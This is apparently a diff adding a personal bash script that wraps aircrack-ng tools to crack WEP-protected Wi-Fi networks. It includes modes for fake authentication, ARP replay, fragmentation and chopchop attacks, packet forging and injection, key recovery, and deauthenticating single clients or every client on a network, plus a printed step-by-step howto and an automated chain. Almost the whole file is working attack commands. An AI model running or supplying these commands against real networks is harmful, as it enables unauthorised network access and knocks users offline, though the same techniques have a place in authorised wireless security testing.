@@ -1,0 +1,177 @@
+#!/usr/bin/env bash
+# IFACE="wlp0s20u1"
+IFACE="wlp2s0"
+SELFMAC="b4:6b:fc:f6:fc:7a"
+# SELFMAC="E8:4E:06:0C:A1:4E"
+MODE=$1
+PREFIX="attack_packets"
+
+if test -z $MODE
+	then
+echo "";
+echo "--------------------";
+echo "USAGE: attack [mode] [options]";
+echo "MODES:";
+echo "howto                   show a howto for breaking into a WEP network";
+echo "monitor                 put to monitor mode and kill NetworkManager";
+echo "back                    put back to managed and start NetworkManager"
+echo "test                    injection test";
+echo "hop                     dump on all channels"
+echo "dump    CHANNEL         start airodump-ng";
+echo "auth    BSSID           fake auth";
+echo "arp     BSSID           arp-replay";
+echo "frag    BSSID           fragmentation attack";
+echo "chop    BSSID           chopchop-attack";
+echo "crack   BSSID           recover wep-key";
+echo "forge   BSSID           forge arp package";
+echo "inject  CAPFILE         inject package";
+echo "kick    BSSID MAC       deauth client";
+echo "kickme  BSSID           deauth yourself";
+echo "kickall BSSID           deauth broadcast";
+echo "";
+echo "interface/mac-address/fileprefix can be edited in scriptfile"
+echo "--------------------"
+	exit;
+fi
+
+if test $MODE = "monitor"
+	then
+	#sudo killall NetworkManager
+        #sleep 2
+	#sudo modprobe -r iwl3945
+	#sudo modprobe iwl3945
+	#sudo ifconfig eth1 down
+	#sudo iwconfig $IFACE mode monitor
+	#sudo ifconfig eth1 up
+    sudo systemctl stop NetworkManager.service
+    sudo airmon-ng start $IFACE
+fi
+
+if test $MODE = "back"
+	then
+	#sudo killall airodump-ng
+        #sudo killall aireplay-ng
+	#sudo ifconfig eth1 down
+	#sudo iwconfig $IFACE mode managed
+	#sudo ifconfig eth1 up
+	#sudo NetworkManager
+
+    sudo airmon-ng stop wlp2s0mon
+    sudo systemctl start NetworkManager.service
+fi
+
+if test $MODE = "test"
+	then
+	 sudo aireplay-ng -9 wlp2s0mon
+fi
+
+if test $MODE = "dump"
+	then
+	 sudo airodump-ng wlp2s0mon -c $2 -w $PREFIX -t WEP -t OPN
+fi
+
+if test $MODE = "hop"
+	then
+	 sudo airodump-ng wlp2s0mon -w $PREFIX -t WEP -t OPN
+fi
+
+if test $MODE = "auth"
+	then
+	 sudo aireplay-ng -1 6000 -o 1 -q 10 -a $2 -h $SELFMAC wlp2s0mon
+fi
+
+if test $MODE = "arp"
+	then
+	 sudo aireplay-ng -3 -b $2 -h $SELFMAC wlp2s0mon
+fi
+
+if test $MODE = "frag"
+	then
+	 sudo aireplay-ng -5 -b $2 -h $SELFMAC wlp2s0mon
+fi
+
+if test $MODE = "chop"
+	then
+	 sudo aireplay-ng -4 -b $2 -h $SELFMAC wlp2s0mon
+fi
+
+if test $MODE = "crack"
+	then
+	 aircrack-ng -s $PREFIX*.cap -b $2
+fi
+
+if test $MODE = "forge"
+	then
+	 packetforge-ng --arp -a $2 -h $SELFMAC -k 255.255.255.255 -l 255.255.255.255 -y *.xor -w attack_arp-request
+fi
+
+if test $MODE = "inject"
+	then
+	 sudo aireplay-ng -2 -r $2 wlp2s0mon
+fi
+
+if test $MODE = "kick"
+	then
+	 sudo aireplay-ng -0 1 -a $2 -h $SELFMAC -c $3 wlp2s0mon
+fi
+
+if test $MODE = "kickme"
+	then
+	 sudo aireplay-ng -0 1 -a $2 -h $SELFMAC -c $SELFMAC wlp2s0mon
+fi
+
+if test $MODE = "kickall"
+	then
+	 sudo aireplay-ng -0 1 -a $2 -h $SELFMAC wlp2s0mon
+fi
+
+if test $MODE = "howto"
+	then
+	 echo "- edit this script and change MAC and IFACE"
+	 echo "- open 4 Terminals:"
+	 echo "  1. for dumping packets"
+	 echo "  2. for fake auth"
+	 echo "  3. for injection"
+	 echo "  4. for cracking"
+	 echo "1: attack monitor"
+	 echo "1: attack hop (then select network and remember channel)"
+	 echo "1: attack dump CHANNEL"
+	 echo "2: attack auth BSSID"
+	 echo "3: attack frag BSSID / attack chop BSSID"
+	 echo "3: attack forge BSSID"
+	 echo "3: attack inject arp-request"
+	 echo "4: attack crack bssid"
+	 echo "4: attack back"
+fi
+
+if test $MODE = "auto"
+  then
+  BSSID=$2
+  CHANNEL=$3
+
+  #monitor
+	#sudo killall NetworkManager
+        #sleep 2
+	#sudo modprobe -r iwl3945
+	#sudo modprobe iwl3945
+	#sudo ifconfig eth1 down
+	#sudo iwconfig $IFACE mode monitor
+	#sudo ifconfig eth1 up
+    sudo systemctl stop NetworkManager.service
+    airmon-ng check kill
+    sudo airmon-ng start $IFACE
+
+  #dump
+  termite -e "sudo airodump-ng wlp2s0mon -c $CHANNEL -w $PREFIX -t WEP -t OPN"
+  #auth
+  termite -e "sudo aireplay-ng -1 6000 -o 1 -q 10 -a $BSSID -h $SELFMAC wlp2s0mon"
+  #crack
+  termite -e "aircrack-ng -s $PREFIX*.cap -b $BSSID"
+
+  #chop
+  sudo aireplay-ng -4 -b $BSSID -h $SELFMAC wlp2s0mon
+  #forge
+  packetforge-ng -0 -a $BSSID -h $SELFMAC -k 255.255.255.255 -l 255.255.255.255 -y fragment*.xor -w attack_arp-request
+  #inject
+  sudo aireplay-ng -2 -r attack_arp-request wlp2s0mon
+fi
